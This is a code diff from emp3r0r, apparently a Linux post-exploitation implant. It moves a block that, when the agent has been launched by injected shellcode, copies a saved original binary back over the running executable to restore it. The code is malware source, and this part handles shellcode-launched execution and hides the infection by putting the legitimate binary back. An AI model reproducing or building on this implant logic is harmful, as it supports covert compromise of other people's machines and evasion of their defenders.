@@ -45,14 +45,6 @@ func main() {
 		log.Printf("emp3r0r %d is invoked by shellcode in %d", os.Getpid(), os.Getppid())
 		os.Setenv("LD", "true") // it's the same thing, i don't want another env var
 
-		// restore original executable file
-		out, err := exec.Command("/bin/cp", "-f",
-			fmt.Sprintf("%s/%s",
-				agent.RuntimeConfig.AgentRoot, util.FileBaseName(util.ProcExePath(os.Getpid()))),
-			util.ProcExePath(os.Getpid())).CombinedOutput()
-		if err != nil {
-			log.Printf("failed to restore original executable: %s (%v)", out, err)
-		}
 	}
 
 	// accept env vars
@@ -169,6 +161,17 @@ func main() {
 	err = agent.ApplyRuntimeConfig()
 	if err != nil {
 		log.Fatalf("ApplyRuntimeConfig: %v", err)
+	}
+
+	if run_from_shellcode {
+		// restore original executable file
+		out, err := exec.Command("/bin/cp", "-f",
+			fmt.Sprintf("%s/%s",
+				agent.RuntimeConfig.AgentRoot, util.FileBaseName(util.ProcExePath(os.Getpid()))),
+			util.ProcExePath(os.Getpid())).CombinedOutput()
+		if err != nil {
+			log.Printf("failed to restore original executable: %s (%v)", out, err)
+		}
 	}
 
 	// don't be hasty
